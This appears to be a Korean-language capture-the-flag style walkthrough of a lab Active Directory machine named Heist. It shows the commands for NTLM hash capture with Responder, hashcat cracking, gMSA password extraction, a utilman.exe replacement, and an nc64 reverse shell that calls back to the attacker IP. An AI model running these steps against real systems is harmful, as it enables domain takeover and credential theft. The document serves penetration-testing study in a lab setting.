## Nmap
```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ nnmap 192.168.120.165
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-08 13:56 +0900
Nmap scan report for 192.168.120.165
Host is up (0.084s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-08 04:56:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-08T04:58:17+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Not valid before: 2026-07-07T04:55:18
|_Not valid after:  2027-01-06T04:55:18
| rdp-ntlm-info:
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-08T04:57:37+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
|_http-title: Super Secure Web Browser
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-08T04:57:39
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   83.50 ms 192.168.45.1
2   83.37 ms 192.168.45.254
3   83.82 ms 192.168.251.1
4   83.90 ms 192.168.120.165

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.39 seconds
```

8080포트에 웹페이지 확인
![[Pasted image 20260708140815.png]]

특정 주소로 접근할 수 있도록 함
![[Pasted image 20260708140840.png]]

kali ip 접근시킴
![[Pasted image 20260708140909.png]]

대기중이던 responder 에서 NTLM 확보
```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ sudo responder -I tun0
[sudo] password for kali:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [192.168.45.175]
    Responder IPv6             [fe80::25d8:5e38:85a8:35ab]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-71JGXA4QU0P]
    Responder Domain Name      [TJJ7.LOCAL]
    Responder DCE-RPC Port     [46788]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...

[HTTP] NTLMv2 Client   : 192.168.120.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:a9a24c7373e7eaf6:812295EA02430380A3C69B6C8CD67A27:01010000000000007062E9B8970EDD010F8C5BB3E46D76E3000000000200080054004A004A00370001001E00570049004E002D00370031004A00470058004100340051005500300050000400140054004A004A0037002E004C004F00430041004C0003003400570049004E002D00370031004A00470058004100340051005500300050002E0054004A004A0037002E004C004F00430041004C000500140054004A004A0037002E004C004F00430041004C00080030003000000000000000000000000030000098BF0D68BEA36AC69F27F02B4B5580B35A970EAA12F2C2D466BA29E944A8C58C0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100370035000000000000000000

```

![[Pasted image 20260708140946.png]]
![[Pasted image 20260708140953.png]]

확보한 해시로 hashcat 실행 `enox/california` 자격증명 확보
```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ cat hash.txt
enox::HEIST:a9a24c7373e7eaf6:812295EA02430380A3C69B6C8CD67A27:01010000000000007062E9B8970EDD010F8C5BB3E46D76E3000000000200080054004A004A00370001001E00570049004E002D00370031004A00470058004100340051005500300050000400140054004A004A0037002E004C004F00430041004C0003003400570049004E002D00370031004A00470058004100340051005500300050002E0054004A004A0037002E004C004F00430041004C000500140054004A004A0037002E004C004F00430041004C00080030003000000000000000000000000030000098BF0D68BEA36AC69F27F02B4B5580B35A970EAA12F2C2D466BA29E944A8C58C0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100370035000000000000000000

┌──(kali㉿kali)-[~/PG/Heist]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 11147/22294 MB (4096 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (20165 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ENOX::HEIST:a9a24c7373e7eaf6:812295ea02430380a3c69b6c8cd67a27:01010000000000007062e9b8970edd010f8c5bb3e46d76e3000000000200080054004a004a00370001001e00570049004e002d00370031004a00470058004100340051005500300050000400140054004a004a0037002e004c004f00430041004c0003003400570049004e002d00370031004a00470058004100340051005500300050002e0054004a004a0037002e004c004f00430041004c000500140054004a004a0037002e004c004f00430041004c00080030003000000000000000000000000030000098bf0d68bea36ac69f27f02b4b5580b35a970eaa12f2c2d466ba29e944a8c58c0a001000000000000000000000000000000000000900260048005400540050002f003100390032002e003100360038002e00340035002e003100370035000000000000000000:california

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ENOX::HEIST:a9a24c7373e7eaf6:812295ea02430380a3c69b...000000
Time.Started.....: Wed Jul  8 14:10:29 2026 (0 secs)
Time.Estimated...: Wed Jul  8 14:10:29 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1244.3 kH/s (1.21ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> oooooo
Hardware.Mon.#01.: Util: 27%

Started: Wed Jul  8 14:10:28 2026
Stopped: Wed Jul  8 14:10:30 2026
```
![[Pasted image 20260708141125.png]]


자격증명 확인
```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ nxc-sweep 192.168.120.165 -u 'enox' -p 'california'
[*] Starting NXC sweep for 192.168.120.165 as enox ...

[+] Port 445 open. Checking smb ...
SMB         192.168.120.165 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:heist.offsec) (signing:True) (SMBv1:False)
SMB         192.168.120.165 445    DC01             [+] heist.offsec\enox:california
SMB         192.168.120.165 445    DC01             [*] Enumerated shares
SMB         192.168.120.165 445    DC01             Share           Permissions     Remark
SMB         192.168.120.165 445    DC01             -----           -----------     ------
SMB         192.168.120.165 445    DC01             ADMIN$                          Remote Admin
SMB         192.168.120.165 445    DC01             C$                              Default share
SMB         192.168.120.165 445    DC01             IPC$            READ            Remote IPC
SMB         192.168.120.165 445    DC01             NETLOGON        READ            Logon server share
SMB         192.168.120.165 445    DC01             SYSVOL          READ            Logon server share

[+] Port 5985 open. Checking winrm ...
WINRM       192.168.120.165 5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:heist.offsec)
WINRM       192.168.120.165 5985   DC01             [+] heist.offsec\enox:california (Pwn3d!)

[+] Port 3389 open. Checking rdp ...
RDP         192.168.120.165 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:heist.offsec) (nla:False)
RDP         192.168.120.165 3389   DC01             [+] heist.offsec\enox:california

[-] Port 1433 closed/filtered. Skipping mssql

[-] Port 21 closed/filtered. Skipping ftp

[*] All active services checked.
```

![[Pasted image 20260708141241.png]]

evil-winrm 사용하여 접근 후 flag 확인
```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ evil-winrm -i 192.168.120.165 -u 'enox' -p 'california'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\enox\Documents> type c:\users\enox\desktop\local.txt
a1909577c8fb09bed9a1ff474af80620
```

유저 목록 확인
![[Pasted image 20260708144718.png]]

svc_apache$ 확인 , enox의 경우 web admin 그룹이므로 svc_apache$ 의 hash 볼 수 있음

![[Pasted image 20260708150543.png]]
hash 보는 2가지 방법

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ bloodyAD --host 192.168.120.165 -d heist.offsec -u enox -p california get object 'svc_apache$' --attr msDS-ManagedPassword

distinguishedName: CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:76a431e264ca606c0ade543f59b7a470
msDS-ManagedPassword.B64ENCODED: bZWXotad8olrCM62+lM8Gm2/91Dy7WKBUKgAVwec1REk/1O4KTfQJSas94jwsyFH1FrT37sSZ9vlyXGN1oGRZNdS/oJSCWog+t8ViAiQKHHCqz3lodTwCCRIOd6yyeXpHqPB1/S+mIMXo+eyZL+uC/lIOk0uZWFPzKhwzNCNedjG90f6sz7RBsMiUO/LYK9dCbKKvhzzpGlFKSYk8H0rnIPMM8I2ycz8h1EJl/YwSjqMfi1IAz6JZIB28xJ1Vr4e6UPA1chwbeG+1by28v5VrL9dqlZWe9UYj3YVxdfv7E5sNGqfLCOW3ZQQaQVgbV/+Oul8t2KlfCMIpKhaMbjjKA==
```

```powershell
*Evil-WinRM* PS C:\Users\enox\Documents> iwr 192.168.45.175/GMSAPasswordReader.exe -o reader.exe
*Evil-WinRM* PS C:\Users\enox\Documents> .\reader.exe --accountname svc_apache
Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : AD580D1BA99F2167B14EC7DB4D3E0F9C
[*]       aes128_cts_hmac_sha1 : 948AC08EE52E117368FD6E2CEC771D83
[*]       aes256_cts_hmac_sha1 : 031595195375D0FE66DF2783398C289629BA1243604BA2EEC6EA3ABEDCF2C819
[*]       des_cbc_md5          : E9B368D308FBDC58

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 76A431E264CA606C0ADE543F59B7A470
[*]       aes128_cts_hmac_sha1 : B7DB7F6148D4DD3C7B101F7C1F846CDE
[*]       aes256_cts_hmac_sha1 : 7D529FCF364669301FA43E8040F5655F459D39847A305BA76BC8040C0B94217D
[*]       des_cbc_md5          : 83E6F249922FE04C
```

evil-winrm 접근 및 권한 확인
```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ evil-winrm -i 192.168.120.165 -u 'svc_apache$' -H '76A431E264CA606C0ADE543F59B7A470'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

SeRestorePrivilege 확인 후 utilman.exe 변조
```powershell
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> cd c:\
*Evil-WinRM* PS C:\> cd windows
*Evil-WinRM* PS C:\windows> cd system32
*Evil-WinRM* PS C:\windows\system32> ren utilman.exe utilman.old
*Evil-WinRM* PS C:\windows\system32> ren cmd.exe Utilman.exe
*Evil-WinRM* PS C:\windows\system32>
```
![[Pasted image 20260708152930.png]]

RDP 접근 
```bash
xfreerdp3 /v:192.168.120.165 /cert:ignore /sec:tls

```

win+U 버튼 누른 후 flag 획득
![[Pasted image 20260708153113.png]]

## 다른방법

SeRestoreAbuse.exe, nc64.exe 업로드
```powershell
*Evil-WinRM* PS C:\users\svc_apache$\desktop> iwr 192.168.45.175/SeRestoreAbuse.exe -o SeRestoreAbuse.exe
*Evil-WinRM* PS C:\users\svc_apache$\desktop> iwr 192.168.45.175/nc64.exe -o nc64.exe
```
![[Pasted image 20260708155147.png]]


SeRestoreAbuse.exe 실행하면서 Start-Service seclogon 입력
```powershell
*Evil-WinRM* PS C:\users\svc_apache$\desktop> .\SeRestoreAbuse.exe "C:\users\svc_apache$\desktop\nc64.exe 192.168.45.175 4444 -e powershell.exe"
Start-Service seclogon
RegCreateKeyExA result: 0
RegSetValueExA result: 0
```
![[Pasted image 20260708155102.png]]

리버스쉘로 접근 후 flag 확인
```bash
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.175] from (UNKNOWN) [192.168.120.165] 50227
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> type c:\users\administrator\desktop\proof.txt
type c:\users\administrator\desktop\proof.txt
b041c78918d81a4a4a15732053a1e416
PS C:\Windows\system32>
```
![[Pasted image 20260708155109.png]]